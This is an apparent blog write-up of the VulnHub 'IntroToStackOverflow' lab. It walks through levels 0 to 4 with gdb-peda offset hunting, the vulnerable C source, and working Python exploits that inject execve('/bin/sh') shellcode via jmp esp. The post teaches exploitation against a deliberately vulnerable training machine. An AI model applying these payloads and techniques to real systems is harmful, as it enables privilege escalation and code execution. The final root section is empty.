---
layout: post
title: Intro to Stack Buffer Overflow
categories: vulnhub
permalink: /introtobof
---

<pre style="font-size: 7px; color: white;display: inline-block; border:0px solid Black; background: #fffff; overflow: auto; overflow-y: hidden;"><code>

      :::::::: ::::::::::: :::      ::::::::  :::    ::: ::::::::  :::     ::: :::::::::: :::::::::  :::::::::: :::        ::::::::  :::       ::: 
    :+:    :+:    :+:   :+: :+:   :+:    :+: :+:   :+: :+:    :+: :+:     :+: :+:        :+:    :+: :+:        :+:       :+:    :+: :+:       :+:  
   +:+           +:+  +:+   +:+  +:+        +:+  +:+  +:+    +:+ +:+     +:+ +:+        +:+    +:+ +:+        +:+       +:+    +:+ +:+       +:+   
  +#++:++#++    +#+ +#++:++#++: +#+        +#++:++   +#+    +:+ +#+     +:+ +#++:++#   +#++:++#:  :#::+::#   +#+       +#+    +:+ +#+  +:+  +#+    
        +#+    +#+ +#+     +#+ +#+        +#+  +#+  +#+    +#+  +#+   +#+  +#+        +#+    +#+ +#+        +#+       +#+    +#+ +#+ +#+#+ +#+     
#+#    #+#    #+# #+#     #+# #+#    #+# #+#   #+# #+#    #+#   #+#+#+#   #+#        #+#    #+# #+#        #+#       #+#    #+#  #+#+# #+#+#       
########     ### ###     ###  ########  ###    ### ########      ###     ########## ###    ### ###        ########## ########    ###   ###         
</code>
</pre>
# Overview:
The [IntroToStackOverflow][1] virtual machine is, as the name suggests, an intro to exploting a stack based buffer overflow.
The vulnerability is exploited in binaries which are x86 compiled with protections such as NX, ASLR, DEP, Canary, etc disabled which prevent modification of the registries during process execution.

There are 5 levels which become progressively harder. The starting level is 0 which is meant to show you how the `EIP` is overwritten. 

The `EIP` is the registry which is want will be controlled to point to the memory address which the program will execute.
Therefore, execution of malicious code being possible. In example, getting a reverse shell or spawning a bash shell with elevated privileges.

# $ echo Level 0 -> Level 1:

The very first level is used mainly to create an understand of how the `EIP` register gets overwritten. A simple C program is compiled and its code present for reading. The code exists in the home directory of `level0` user.

<code>level0@kali:~$ cat levelOne.c</code>
```C
#include <stdio.h>
#include <string.h>
#include <unistd.h>

int main(int argc, char **argv) {

    uid_t uid = geteuid();

    setresuid(uid, uid, uid);

    long key = 0x12345678;
    char buf[32];

    strcpy(buf, argv[1]);

    printf("Buf is: %s\n", buf);
    printf("Key is: 0x%08x\n", key);

    if(key == 0x42424242) {
        execve("/bin/sh", 0, 0);
    }
    else {
        printf("%s\n", "Sorry try again...");
    }

    return 0;
}
```
The C code is clearely showing that it is expecting an argument from the user when the program is launched. The it gets the SUID bit of the program and sets it accordingly, since the program is owned by the next user `level1` it will run with his privileges. 

There are 2 variables `key` and `buf` which is an array of 32 bytes (can hold up to 32 characters). Then the argument which is supplied by the user gets `strcpy`'d to the `buf` array. However, since the `strcpy()` function is actually problematic, it will continue to copy information infinitely to the stack therefore overflowing it.

There is also an `if` statement which checks if the variable `key` is equal to `0x42424242` == '**BBBB**'. If this condition is true, then an `execve()` is exectuted setting the UID & GID to the user `level1` and `/bin/sh` is executed which gives interactive sh session as user `level1`.

The output of the program would also display what is the value of the `EIP` register.

Provide the program with 32 "A" <code>./levelOne AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</code>
The following output should be displayed:

```shell
level0@kali:~$ ./levelOne AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Buf is: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Key is: 0x12345600
Sorry try again...
```

The "**key**" value is `0x12345600` and is not what the program expects which should be `0x42424242`. Let's provide 4 more "A".

```shell
level0@kali:~$ ./levelOne AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Buf is: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Key is: 0x41414141
Sorry try again...
```

Now the key is shows a result of "AAAA" which the `EIP` is pointing at. Replacing the 4 "A" at the end of the string with "B" should provide the program with the needed value and spawn an sh session as user `level1`

```bash
level0@kali:~$ ./levelOne AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB
Buf is: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB
Key is: 0x42424242
$ id
uid=1001(level1) gid=1000(level0) groups=1000(level0)
$ cat /home/level1/level1.txt
d13e3e4d[REDACTED]
```
# $ echo Level 1 -> Level 2:

At this level there is no code is provided, therefore, everything needs to be done using the gdb debugger. 

There is a very useful python program called [gdb-peda][2] which intergrates with `gdb`. It will be used to make the debugging a little bit more easy and provide with some very useful functions, such as finding `jmp` calls and create a cyclical pattern. This can then be used to find the offset of the `EIP`. This essentially means at how many bytes does the program handle input normally.

Example would be if a program has an offset of 128 bytes, at 132 bytes `EIP` will be overwritten.

Follow the instructions in the github page to set up the tool.

Load the compiled binary in gdb <code>$ gdb levelTwo</code>.
Now let's show all functions that the program has. Reload the program in gdb-peda.

```bash
gdb-peda$ info functions
All defined functions:

Non-debugging symbols:
0x00001000  _init
0x00001030  setresuid@plt
0x00001040  printf@plt
0x00001050  geteuid@plt
0x00001060  strcpy@plt
0x00001070  __libc_start_main@plt
0x00001080  execve@plt
0x00001090  setuid@plt
0x000010a0  __cxa_finalize@plt
0x000010b0  _start
0x000010f0  __x86.get_pc_thunk.bx
0x00001100  deregister_tm_clones
0x00001140  register_tm_clones
0x00001190  __do_global_dtors_aux
0x000011e0  frame_dummy
0x000011e5  __x86.get_pc_thunk.dx
0x000011e9  spawn
0x00001224  hello
0x00001264  main
0x000012d0  __libc_csu_init
0x00001330  __libc_csu_fini
0x00001334  _fini
```
Addresses of interest are 

<ul>
<li>0x000011e9  spawn</li>
<li>0x00001224  hello</li>
<li>0x00001264  main</li>
</ul>

Inspect all 3 of them using the following command in gdb-peda <code>gdb-peda$ pd <function\></code> where `<function>` is the name of the function, i.e `spawn`.

```bash
gdb-peda$ pd spawn
Dump of assembler code for function spawn:
   0x000011e9 <+0>:	push   ebp
   0x000011ea <+1>:	mov    ebp,esp
   0x000011ec <+3>:	push   ebx
   0x000011ed <+4>:	sub    esp,0x4
   0x000011f0 <+7>:	call   0x10f0 <__x86.get_pc_thunk.bx>
   0x000011f5 <+12>:	add    ebx,0x2e0b
   0x000011fb <+18>:	sub    esp,0xc
   0x000011fe <+21>:	push   0x0
   0x00001200 <+23>:	call   0x1090 <setuid@plt>
   0x00001205 <+28>:	add    esp,0x10
   0x00001208 <+31>:	sub    esp,0x4
   0x0000120b <+34>:	push   0x0
   0x0000120d <+36>:	push   0x0
   0x0000120f <+38>:	lea    eax,[ebx-0x1ff8]
   0x00001215 <+44>:	push   eax
   0x00001216 <+45>:	call   0x1080 <execve@plt>
   0x0000121b <+50>:	add    esp,0x10
   0x0000121e <+53>:	nop
   0x0000121f <+54>:	mov    ebx,DWORD PTR [ebp-0x4]
   0x00001222 <+57>:	leave
   0x00001223 <+58>:	ret
End of assembler dump.
```
This function has 2 `call` calls. First one at `0x00001200` which will set the UID and the second one spawns likely `/bin/sh` at `0x00001216`. 

Remember that after execution of the program the addresses will change !

Create a cyclic pattern using gdb-peda and provide the output as the argument to the program.

```bash
gdb-peda$ pattern_create 64
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAH'
gdb-peda$ r 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAH'

[----------------------------------registers-----------------------------------]
EAX: 0x47 ('G')
EBX: 0x413b4141 ('AA;A')
ECX: 0x1
EDX: 0xf7fa9890 --> 0x0
ESI: 0xffffd580 --> 0x2
EDI: 0xf7fa8000 --> 0x1d9d6c
EBP: 0x41412941 ('A)AA')
ESP: 0xffffd530 ("AA0AAFAAbAA1AAGAAcAA2AAH")
EIP: 0x61414145 ('EAAa')
EFLAGS: 0x10286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x61414145
[------------------------------------stack-------------------------------------]
0000| 0xffffd530 ("AA0AAFAAbAA1AAGAAcAA2AAH")
0004| 0xffffd534 ("AFAAbAA1AAGAAcAA2AAH")
0008| 0xffffd538 ("bAA1AAGAAcAA2AAH")
0012| 0xffffd53c ("AAGAAcAA2AAH")
0016| 0xffffd540 ("AcAA2AAH")
0020| 0xffffd544 ("2AAH")
0024| 0xffffd548 --> 0xffffd600 ("0cUV@D\376\367\f\326\377\377P\331\377\367\002")
0028| 0xffffd54c --> 0x3e9
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x61414145 in ?? ()
```

Gdb-peda would provide an easy to read information about the stack and registers of the program after execution. The `EIP` register is shown that is pointing to address `0x61414145`. Finding the offset is as easy as follows:

```bash
gdb-peda$ pattern_offset 0x61414145
1631666501 found at offset: 36
```

Peda found that the offset is at 36 bytes, so assuming that 4 more would overwrite the `EIP` register and make it user controllable.

```bash
gdb-peda$ r $(python2 -c 'print "A" * 36 + "B" * 4')
[----------------------------------registers-----------------------------------]
EAX: 0x2f ('/')
EBX: 0x41414141 ('AAAA')
ECX: 0x1
EDX: 0xf7fa9890 --> 0x0
ESI: 0xffffd5a0 --> 0x2
EDI: 0xf7fa8000 --> 0x1d9d6c
EBP: 0x41414141 ('AAAA')
ESP: 0xffffd550 --> 0xffffd700 --> 0x3e9
EIP: 0x42424242 ('BBBB')
EFLAGS: 0x10282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x42424242
[------------------------------------stack-------------------------------------]
0000| 0xffffd550 --> 0xffffd700 --> 0x3e9
0004| 0xffffd554 --> 0x3e9
0008| 0xffffd558 --> 0x3e9
0012| 0xffffd55c --> 0x56556289 (<main+37>:	mov    DWORD PTR [ebp-0x1c],eax)
0016| 0xffffd560 --> 0xf7fa83fc --> 0xf7fa9200 --> 0x0
0020| 0xffffd564 --> 0x56559000 --> 0x3efc
0024| 0xffffd568 --> 0xffffd640 --> 0xffffd7af ("SHELL=/bin/bash")
0028| 0xffffd56c --> 0x3e9
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x42424242 in ?? ()
```

Indeed, providing 4 more bytes of B character, shows that `EIP` is controllable at 40 bytes. 

Run the program once inside gdb-peda and crash it, then obtain the address of the `spawn` function.
The address should be as follows after the first run of the program.

```bash
gdb-peda$ pd spawn
Dump of assembler code for function spawn:
   0x565561e9 <+0>:	push   ebp
   0x565561ea <+1>:	mov    ebp,esp
   0x565561ec <+3>:	push   ebx
   0x565561ed <+4>:	sub    esp,0x4
   0x565561f0 <+7>:	call   0x565560f0 <__x86.get_pc_thunk.bx>
   0x565561f5 <+12>:	add    ebx,0x2e0b
   0x565561fb <+18>:	sub    esp,0xc
   0x565561fe <+21>:	push   0x0
   0x56556200 <+23>:	call   0x56556090 <setuid@plt>
   0x56556205 <+28>:	add    esp,0x10
   0x56556208 <+31>:	sub    esp,0x4
   0x5655620b <+34>:	push   0x0
   0x5655620d <+36>:	push   0x0
   0x5655620f <+38>:	lea    eax,[ebx-0x1ff8]
   0x56556215 <+44>:	push   eax
   0x56556216 <+45>:	call   0x56556080 <execve@plt>
   0x5655621b <+50>:	add    esp,0x10
   0x5655621e <+53>:	nop
   0x5655621f <+54>:	mov    ebx,DWORD PTR [ebp-0x4]
   0x56556222 <+57>:	leave
   0x56556223 <+58>:	ret
End of assembler dump.
```

Take the `ebp` address `0x565561e9` which is the beginning of the function. 
A python exploit can now be developed to execute the `spawn` function and git a shell as the next user `level2`.

One important step to note is that the memory of the `spawn` function needs to be converted to little endian format so that the CPU can understand it.

A complete python exploit would be as follows:

```python
#!/usr/bin/env python2
import struct

junk = "A" * 36
eip = struct.pack("<I", 0x565561e9)

payload = junk + eip
print payload
```

The exploit can then be provided to the program to exploit it.

```bash
level1@kali:~$ ./levelTwo $(python2 exploit.py)
Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�aUV
$ id
uid=1002(level2) gid=1001(level1) groups=1001(level1)
$ cat /home/level2/level2.txt
d658dfc[REDACTED]
```

# $ echo Level 2 -> Level 3:

At level 2, the complexity of the exploit goes up a notch, however, it is not impossible. The key bit for the solution for this challenge is to understand that somehow the program must execute a section of code that the user provides. This is also called a **shellcode**.

Let's examine the program.

Load the `levelThree` binary in gdb-peda and list all the functions as was done in the previous challenge.

```bash
gdb-peda$ info functions
All defined functions:

Non-debugging symbols:
0x00001000  _init
0x00001030  setresuid@plt
0x00001040  printf@plt
0x00001050  geteuid@plt
0x00001060  strcpy@plt
0x00001070  __libc_start_main@plt
0x00001080  __cxa_finalize@plt
0x00001090  _start
0x000010d0  __x86.get_pc_thunk.bx
0x000010e0  deregister_tm_clones
0x00001120  register_tm_clones
0x00001170  __do_global_dtors_aux
0x000011c0  frame_dummy
0x000011c5  __x86.get_pc_thunk.dx
0x000011c9  overflow
0x00001212  main
0x00001280  __libc_csu_init
0x000012e0  __libc_csu_fini
0x000012e4  _fini
```

There is once again a function called `overflow` at address `0x000011c9`. Examine the assembly code of it.

```bash
gdb-peda$ pd overflow
Dump of assembler code for function overflow:
   0x000011c9 <+0>:	push   ebp
   0x000011ca <+1>:	mov    ebp,esp
   0x000011cc <+3>:	push   ebx
   0x000011cd <+4>:	sub    esp,0x104
   0x000011d3 <+10>:	call   0x10d0 <__x86.get_pc_thunk.bx>
   0x000011d8 <+15>:	add    ebx,0x2e28
   0x000011de <+21>:	sub    esp,0x8
   0x000011e1 <+24>:	push   DWORD PTR [ebp+0x8]
   0x000011e4 <+27>:	lea    eax,[ebp-0x108]
   0x000011ea <+33>:	push   eax
   0x000011eb <+34>:	call   0x1060 <strcpy@plt>
   0x000011f0 <+39>:	add    esp,0x10
   0x000011f3 <+42>:	sub    esp,0x8
   0x000011f6 <+45>:	lea    eax,[ebp-0x108]
   0x000011fc <+51>:	push   eax
   0x000011fd <+52>:	lea    eax,[ebx-0x1ff8]
   0x00001203 <+58>:	push   eax
   0x00001204 <+59>:	call   0x1040 <printf@plt>
   0x00001209 <+64>:	add    esp,0x10
   0x0000120c <+67>:	nop
   0x0000120d <+68>:	mov    ebx,DWORD PTR [ebp-0x4]
   0x00001210 <+71>:	leave
   0x00001211 <+72>:	ret
End of assembler dump.
```

This function of the program uses the `strcpy()` method to get information from the user in the form of input, which then gets printed as output.

The `strcpy()` is shown at address `0x000011eb`.

Let's examine the main function of the program and see how and/or if the overflow functions gets called.

```bash
gdb-peda$ pd main
Dump of assembler code for function main:
   0x00001212 <+0>:	lea    ecx,[esp+0x4]
   0x00001216 <+4>:	and    esp,0xfffffff0
   0x00001219 <+7>:	push   DWORD PTR [ecx-0x4]
   0x0000121c <+10>:	push   ebp
   0x0000121d <+11>:	mov    ebp,esp
   0x0000121f <+13>:	push   esi
   0x00001220 <+14>:	push   ebx
   0x00001221 <+15>:	push   ecx
   0x00001222 <+16>:	sub    esp,0x1c
   0x00001225 <+19>:	call   0x10d0 <__x86.get_pc_thunk.bx>
   0x0000122a <+24>:	add    ebx,0x2dd6
   0x00001230 <+30>:	mov    esi,ecx
   0x00001232 <+32>:	call   0x1050 <geteuid@plt>
   0x00001237 <+37>:	mov    DWORD PTR [ebp-0x1c],eax
   0x0000123a <+40>:	sub    esp,0x4
   0x0000123d <+43>:	push   DWORD PTR [ebp-0x1c]
   0x00001240 <+46>:	push   DWORD PTR [ebp-0x1c]
   0x00001243 <+49>:	push   DWORD PTR [ebp-0x1c]
   0x00001246 <+52>:	call   0x1030 <setresuid@plt>
   0x0000124b <+57>:	add    esp,0x10
   0x0000124e <+60>:	mov    eax,DWORD PTR [esi+0x4]
   0x00001251 <+63>:	add    eax,0x4
   0x00001254 <+66>:	mov    eax,DWORD PTR [eax]
   0x00001256 <+68>:	sub    esp,0xc
   0x00001259 <+71>:	push   eax
   0x0000125a <+72>:	call   0x11c9 <overflow>
   0x0000125f <+77>:	add    esp,0x10
   0x00001262 <+80>:	mov    eax,0x0
   0x00001267 <+85>:	lea    esp,[ebp-0xc]
   0x0000126a <+88>:	pop    ecx
   0x0000126b <+89>:	pop    ebx
   0x0000126c <+90>:	pop    esi
   0x0000126d <+91>:	pop    ebp
   0x0000126e <+92>:	lea    esp,[ecx-0x4]
   0x00001271 <+95>:	ret
```

Indeed, the overflow function gets called, which is found at address `0x0000125a`. Above it also exists another call which sets the UID to the user owninig the binary, that is `level3`.

So what needs to be done is, overflow the `EIP` register, find the offset of the buffer... and then...

This is where the unique part of this challenge comes in place. Since the program isn't going to execute our shellcode after providing it once we overflow the `EIP`, that is simply because it wouldn't know where to find our code. 

In such cases a `jmp` call must be found, in particular one that make the program jump back to the stack pointer - `ESP`. Such calls are called `jmp esp`. 

Using gdb-peda, finding a call such as `jmp esp` are easelly found with the following command: <code>jmpcall</code>. But first, lets overflow the `EIP` register and find the offset.

```bash
gdb-peda$ pattern_create 300
'AAA%AAsAABAA$AAnAACAA-AA---SNIP---'
gdb-peda$ r 'AAA%AAsAABAA$AAnAACAA-AA---SNIP---'

[----------------------------------registers-----------------------------------]
EAX: 0x132
EBX: 0x25413225 ('%2A%')
ECX: 0x1
EDX: 0xf7fa9890 --> 0x0
ESI: 0xffffd490 --> 0x2
EDI: 0xf7fa8000 --> 0x1d9d6c
EBP: 0x64254148 ('HA%d')
ESP: 0xffffd440 ("%IA%eA%4A%JA%fA%5A%KA%gA%6A%")
EIP: 0x41332541 ('A%3A')
EFLAGS: 0x10286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x41332541
[------------------------------------stack-------------------------------------]
0000| 0xffffd440 ("%IA%eA%4A%JA%fA%5A%KA%gA%6A%")
0004| 0xffffd444 ("eA%4A%JA%fA%5A%KA%gA%6A%")
0008| 0xffffd448 ("A%JA%fA%5A%KA%gA%6A%")
0012| 0xffffd44c ("%fA%5A%KA%gA%6A%")
0016| 0xffffd450 ("5A%KA%gA%6A%")
0020| 0xffffd454 ("A%gA%6A%")
0024| 0xffffd458 ("%6A%")
0028| 0xffffd45c --> 0x300
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x41332541 in ?? ()
```
The `EIP` register was successfully overwritten, now the offset.

```bash
gdb-peda$ pattern_offset 0x41332541
1093870913 found at offset: 268
```

Now the offset is known and also at what bytes size the `EIP` gets overwritten.
Now find a `jmp esp` call.

```bash
gdb-peda$ jmpcall esp
0x56557043 : jmp esp
0x56558043 : jmp esp
```

Development of an exploit can now begin.

```python
#!/usr/bin/env python2
import struct

ffset = "A" * 268 # offset = 268 (junk)
eip = 0x56558043 # jmpcall : 0x56558043 jmp esp;
ret = struct.pack("<I", eip)
```

Since the program doesn't have its own `execve()` method to launch `/bin/sh` for example, we need to provide our own.

A shellcode to spawn `/bin/sh` can simply be found online. One place is [exploit-db.com](https://www.exploit-db.com/shellcodes/46809).

In exploit development there is one hex code known as a `NOPSLED` aka no operation instruction. It simply tells a program to not do anything and proceed further in memory until it finds a valid address to execute.

This is typically used to allign the stack so that after a `jmp esp` call a program can simply go straight to the shellcode.

With the information so far, a final exploit can be developed which should look something like the following:

```python
#!/usr/bin/env python2
import struct

offset = "A" * 268 # offset = 268 (junk)
eip = 0x56558043 # jmpcall : 0x56558043 jmp esp;
ret = struct.pack("<I", eip) # pack the jmpcall in little endian

# slide to shellcode
nops = "\x90" * 10
shellcode = (
"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69"
"\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
) # execve("/bin/sh")

print offset + ret + nops + shellcode
```

Pass the final exploit to the `levelThree` binary and get access as `level3` user.

```bash
level2@kali:~$ ./levelThree $(./exploit.py)
Buf: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAC�UV����������1�Ph//shh/bin��PS��
                                                       
$ id; cat /home/level3/level3.txt
uid=1003(level3) gid=1002(level2) groups=1002(level2)
2c41d9ef668[REDACTED]
```

# $ echo Level 3 -> Level 4:

The challenge to `level4` is pretty much the same as the previous one. The only difference here is the offset. As such, I am not going to provide the same information as in the previous challenge. Please attempt to replicate the steps and the information can easily be obtained.

Let's find the offset and modify the previous exploit.

```bash
gdb-peda$ pattern_create 300
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAa---SNIP---'
gdb-peda$ r 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA---SNIP---'

[----------------------------------registers-----------------------------------]
EAX: 0x6a ('j')
EBX: 0x41412d41 ('A-AA')
ECX: 0x1
EDX: 0xf7fa9890 --> 0x0
ESI: 0xffffd6d0 --> 0x2
EDI: 0xf7fa8000 --> 0x1d9d6c
EBP: 0x44414128 ('(AAD')
ESP: 0xffffd680 ("A)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
EIP: 0x413b4141 ('AA;A')
EFLAGS: 0x10286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x413b4141
[------------------------------------stack-------------------------------------]
0000| 0xffffd680 ("A)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
0004| 0xffffd684 ("EAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
0008| 0xffffd688 ("AA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
0012| 0xffffd68c ("AFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
0016| 0xffffd690 ("bAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
0020| 0xffffd694 ("AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
0024| 0xffffd698 ("AcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
0028| 0xffffd69c ("2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x413b4141 in ?? ()
```

Find the offset and adjust the previous exploit.

```bash
gdb-peda$ pattern_offset 0x413b4141
1094402369 found at offset: 28
```

The final exploit should look like the following:

```python
#!/usr/bin/env python2
import struct

offset = "A" * 28 # offset = 268 (junk)
eip = 0x56558043 # jmpcall : 0x56558043 jmp esp;
ret = struct.pack("<I", eip) # pack the jmpcall in little endian

# slide to shellcode
nops = "\x90" * 10
shellcode = (
"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69"
"\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
) # execve("/bin/sh")

print offset + ret + nops + shellcode
```
```bash
level3@kali:~$ ./levelFour $(./exploit.py)
Buf: AAAAAAAAAAAAAAAAAAAAAAAAAAAAC�UV����������1�Ph//shh/bin��PS��
                                                                   
$ id; cat /home/level4/level4.txt
uid=1004(level4) gid=1003(level3) groups=1003(level3)
e879069[REDACTED]
```
# $ echo Level 4 -> root:



References:

[1]: <https://www.vulnhub.com/entry/stack-overflows-for-beginners-101,290/> "IntroToStackOverflow"
[2]: <https://github.com/longld/peda> "gdb-peda"
